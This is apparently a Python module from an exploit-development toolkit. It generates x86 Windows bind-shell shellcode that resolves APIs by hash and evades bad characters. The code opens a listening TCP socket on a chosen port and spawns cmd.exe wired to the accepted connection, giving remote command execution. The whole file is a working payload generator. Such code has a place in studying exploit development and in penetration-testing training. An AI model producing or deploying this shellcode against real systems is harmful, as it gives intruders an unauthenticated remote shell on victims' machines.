from coder.util import (
    call_exit_func,
    convert_port_hex,
    find_and_call,
    find_hash_key,
    push_hash,
    push_string,
)


def generate(port, bad_chars, exit_func, debug=False):
    port_hex = convert_port_hex(port)
    hash_key = find_hash_key(
        [
            "LoadLibraryA",
            "WSAStartup",
            "WSASocketA",
            "bind",
            "listen",
            "accept",
            "CreateProcessA",
        ]
        + ([exit_func] if exit_func else []),
        bad_chars,
    )

    return f"""
    start:
        {'int3' if debug else ''}       // Breakpoint for Windbg
        mov   ebp, esp
        add   esp, 0xfffff9f0           // Avoid NULL bytes

    {find_and_call(hash_key)}

    load_ws2_32:                        // HMODULE LoadLibraryA([in] LPCSTR lpLibFileName);
        {push_string('ws2_32.dll', bad_chars)}
        push  esp                       // lpLibFileName = &("ws2_32.dll")
        {push_hash('LoadLibraryA', hash_key)}
        call dword ptr [ebp+0x04]       // Call LoadLibraryA

    call_wsastartup:                    // int WSAStartup(WORD wVersionRequired, [out] LPWSADATA lpWSAData);
        mov   eax, esp                  // Move ESP to EAX
        xor   ecx, ecx                  // ECX = 0
        mov   cx, 0x590                 // Move 0x590 to CX
        sub   eax, ecx                  // Substract CX from EAX to avoid overwriting the structure later
        push  eax                       // lpWSAData = ESP - 0x590
        xor   eax, eax                  // EAX = 0
        mov   ax, 0x0202                // Move version to AX
        push  eax                       // wVersionRequired = 0x202
        {push_hash('WSAStartup', hash_key)}
        call dword ptr [ebp+0x04]       // Call WSAStartup

    call_wsasocketa:                    // SOCKET WSAAPI WSASocketA([in] int af, [in] int type, [in] int protocol, [in] LPWSAPROTOCOL_INFOA lpProtocolInfo, [in] GROUP g, [in] DWORD dwFlags)
        xor   eax, eax                  // EAX = 0
        push  eax                       // dwFlags = NULL
        push  eax                       // g = NULL
        push  eax                       // lpProtocolInfo = NULL
        mov   al, 0x06                  // Move AL, IPPROTO_TCP
        push  eax                       // protocol = 0x6
        sub   al, 0x05                  // Substract 0x05 from AL, AL = 0x01
        push  eax                       // type = 0x1
        inc   eax                       // Increase EAX, EAX = 0x02
        push  eax                       // af = 0x2
        {push_hash('WSASocketA', hash_key)}
        call dword ptr [ebp+0x04]       // Call WSASocketA
        mov   esi, eax                  // esi = sock

    create_sockaddr_in:                 // typedef struct sockaddr_in {{ADDRESS_FAMILY sin_family = AF_INET (0x2); USHORT sin_port; IN_ADDR sin_addr = 0; CHAR sin_zero[8];}}
        xor   eax, eax                  // eax = 0
        push  eax                       // sin_zero[4:8] = NULL
        push  eax                       // sin_zero[0:4] = NULL
        push  eax                       // sin_addr = NULL
        mov   ax, {port_hex}            // ax = port
        shl   eax, 0x10                 // eax < 0x10
        add   al, 0x2                   // ax = AF_INET (0x2)
        push  eax                       // sin_port = port, sin_family = 0x2
        push  esp                       // Set &(sockaddr_in)
        pop   edi                       // edi = &(sockaddr_in)

    call_bind:                          // int bind([in] SOCKET s, const sockaddr *addr, [in] int namelen)
        xor   eax, eax                  // eax = 0
        add   al, 0x10                  // eax = namelen (0x10)
        push  eax                       // namelen = 0x10
        push  edi                       // addr = &(sockaddr_in)
        push  esi                       // s = sock
        {push_hash('bind', hash_key)}
        call dword ptr [ebp+0x04]       // Call bind

    call_listen:                        // int WSAAPI listen([in] SOCKET s, [in] int backlog)
        xor   eax, eax                  // eax = 0
        push  eax                       // backlog = 0
        push  esi                       // s = sock
        {push_hash('listen', hash_key)}
        call dword ptr [ebp+0x04]       // Call listen

    call_accept:                        // SOCKET WSAAPI accept([in] SOCKET s, [out] sockaddr *addr, [in, out] int *addrlen)
        xor   eax, eax                  // eax = 0
        push  eax                       // addrlen = 0
        push  eax                       // addr = 0
        push  esi                       // s = sock
        {push_hash('accept', hash_key)}
        call dword ptr [ebp+0x04]       // Call accept
        mov   esi, eax                  // esi = accept()

    create_startupinfoa:                // typedef struct _STARTUPINFOA {{DWORD cb; LPSTR lpReserved; LPSTR lpDesktop; LPSTR lpTitle; DWORD dwX; DWORD dwY; DWORD dwXSize; DWORD dwYSize; DWORD dwXCountChars; DWORD dwYCountChars; DWORD dwFillAttribute; DWORD dwFlags; WORD wShowWindow; WORD cbReserved2; LPBYTE lpReserved2; HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError;}}
        push  esi                       // hStdError = sock
        push  esi                       // hStdOutput = sock
        push  esi                       // hStdInput = sock
        xor   eax, eax                  // eax = NULL
        lea   ecx, [eax + 0xd]          // ecx = loop limit

    create_startupinfoa_push_loop:
        push  eax                            // Set NULL dword
        loop  create_startupinfoa_push_loop  // ecx = 0xd; do {{ecx--; ...}} while (ecx > 0)
        mov   al, 0x44                       // eax = 0x44
        push  eax                            // cb = 0x44
        push  esp                            // Set &(startupinfoa)
        pop   edi                            // edi = &(startupinfoa)
        mov   word ptr [edi + 4*11], 0x101   // dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW

    create_cmd_string:
        {push_string('cmd.exe', bad_chars)}
        mov ebx, esp

    call_createprocessa:                // BOOL CreateProcessA([in, optional] LPCSTR lpApplicationName, [in, out, optional] LPSTR lpCommandLine, [in, optional] LPSECURITY_ATTRIBUTES lpProcessAttributes, [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] BOOL bInheritHandles, [in] DWORD dwCreationFlags, [in, optional] LPVOID lpEnvironment, [in, optional] LPCSTR lpCurrentDirectory, [in] LPSTARTUPINFOA lpStartupInfo, [out] LPPROCESS_INFORMATION lpProcessInformation)
        mov   eax, esp                  // Move ESP to EAX
        xor   ecx, ecx                  // ecx = 0
        mov   cx, 0x390                 // ecx = 0x390
        sub   eax, ecx                  // eax = &(processinformation) (esp - 0x390)
        push  eax                       // lpProcessInformation = &(processinformation)
        push  edi                       // lpStartupInfo = &(startupinfoa)
        xor   eax, eax                  // EAX = 0
        push  eax                       // lpCurrentDirectory = NULL
        push  eax                       // lpEnvironment = NULL
        push  eax                       // dwCreationFlags = NULL
        inc   eax                       // eax = true
        push  eax                       // bInheritHandles = true
        dec   eax                       // EAX = 0
        push  eax                       // lpThreadAttributes = NULL
        push  eax                       // lpProcessAttributes = NULL
        push  ebx                       // lpCommandLine = &("cmd.exe")
        push  eax                       // lpApplicationName = NULL
        {push_hash('CreateProcessA', hash_key)}
        call dword ptr [ebp+0x04]       // Call CreateProcessA

    {call_exit_func(exit_func, hash_key)}
    """
